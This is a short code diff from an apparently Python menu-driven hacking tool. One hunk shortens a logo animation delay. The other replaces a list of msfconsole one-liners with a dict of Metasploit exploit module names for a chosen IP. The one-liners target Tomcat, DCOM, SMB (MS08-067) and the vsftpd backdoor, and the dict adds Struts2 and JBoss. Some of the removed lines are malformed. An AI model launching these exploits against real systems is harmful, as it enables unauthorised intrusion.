@@ -82,7 +82,7 @@ def show_main_menu_logo():
         print(Fore.RED + line)  # Blue for even lines
       else:
         print(Fore.LIGHTRED_EX + line)  # White for odd lines
-      time.sleep(0.3)  # Medium delay (0.3 seconds per line)
+      time.sleep(0.1)  # Medium delay (0.3 seconds per line)
 
 # Function to run a scan with a given command
 def run_scan(command, ip=None):
@@ -506,13 +506,12 @@ def metasploit_scan():
            elif choice == '5':
               print(Fore.BLUE + "\nViewing all network exploits...")
               exploits = {
-               "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOST {ip}; set RPORT 4444 run'",  
-               "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {ip}; set RPORT 4444 run '",    
-               "msfconsole -q -x 'use auxiliary/scanner/http/ssl; set RHOSTS {ip}; set RPORT 4444 run'",  
-               "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS {ip}; set RPORT 4444 run '",  
-               "msfconsole -q -x 'use exploit/windows/dcerpc/ms03_026_dcom; set RHOSTS {ip}; set RPORT 4444 run '",  
-               "msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {ip}; set RPORT 4444 run '",  
-               "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip}; {ip}; set RPORT 4444 run'",  
+               "11": "exploit/multi/http/tomcat_mgr_upload",  
+                "22": "exploit/windows/dcerpc/ms03_026_dcom",  
+                "33": "exploit/windows/smb/ms08_067_netapi",  
+                "44": "exploit/unix/ftp/vsftpd_234_backdoor",  
+                "55": "exploit/multi/http/struts2_code_exec",  
+                "66": "exploit/multi/http/jboss_deployment_scanner"  
       
               }  
               
